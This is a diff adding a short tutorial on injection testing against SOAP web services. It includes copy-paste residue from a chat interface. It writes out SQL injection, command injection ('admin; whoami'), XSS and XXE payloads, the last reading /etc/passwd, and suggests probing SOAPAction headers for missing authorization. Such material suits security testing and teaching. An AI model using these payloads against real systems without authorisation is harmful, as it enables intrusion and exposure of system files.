@@ -1,0 +1,75 @@
+🧾 Step 1: Understand SOAP Structure
+SOAP requests are XML-based and typically look like this:
+
+xml
+Copy
+Edit
+POST /service HTTP/1.1
+Host: example.com
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "getUser"
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getUser>
+      <username>admin</username>
+    </getUser>
+  </soap:Body>
+</soap:Envelope>
+Your injection payloads go inside values like <username>, or as injected entities in the XML body.
+
+💉 Step 2: Injection Points in SOAP
+1. Basic Input Field Injection
+Try inserting payloads into <username> or similar input fields:
+
+🔹 SQLi Test:
+xml
+Copy
+Edit
+<username>admin' or '1'='1</username>
+🔹 Command Injection Test:
+xml
+Copy
+Edit
+<username>admin; whoami</username>
+🔹 XSS Test (for web UIs):
+xml
+Copy
+Edit
+<username><script>alert(1)</script></username>
+2. XXE Injection in SOAP
+Inject an external entity if parser allows it:
+
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getUser>
+      <username>&xxe;</username>
+    </getUser>
+  </soap:Body>
+</soap:Envelope>
+➡️ If the server reflects /etc/passwd, it's vulnerable to XXE.
+
+3. SOAPAction Header Abuse
+Sometimes, the SOAPAction header is misused for access control.
+
+Try:
+
+http
+Copy
+Edit
+SOAPAction: "admin:getUsers"
+or change it to invalid ones:
+
+http
+Copy
+Edit
+SOAPAction: "badMethod"
+See how the server responds. If method is accepted without auth, that’s a misconfig.
